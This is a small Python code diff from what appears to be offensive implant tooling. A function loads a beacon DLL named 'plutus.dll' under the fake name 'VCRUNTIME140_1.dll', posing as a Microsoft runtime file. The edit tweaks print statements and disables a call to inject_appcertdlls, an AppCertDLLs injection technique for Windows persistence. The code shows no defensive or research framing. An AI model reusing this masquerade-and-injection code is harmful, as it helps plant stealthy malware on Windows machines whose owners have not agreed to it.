@@ -283,12 +283,15 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     # print (PACKAGE_ROOT)
     # path = f"{PACKAGE_ROOT}/plutus.dll"
     file = glob.glob(f"{PACKAGE_ROOT}\plutus.dll")[0]
-    print (file)
+    # print (file)
+    print (str(file))
     with open(file, "rb") as f:
         data = f.read()
-    
-    inject_appcertdlls(file)
 
+
+    '''    
+    inject_appcertdlls(file)
+    '''
     # dll = ctypes.WinDLL("plutus.dll")  # assuming it's already reflectively loaded or on disk
 
     # # Define the function signature (this is hypothetical - actual signature varies by version)
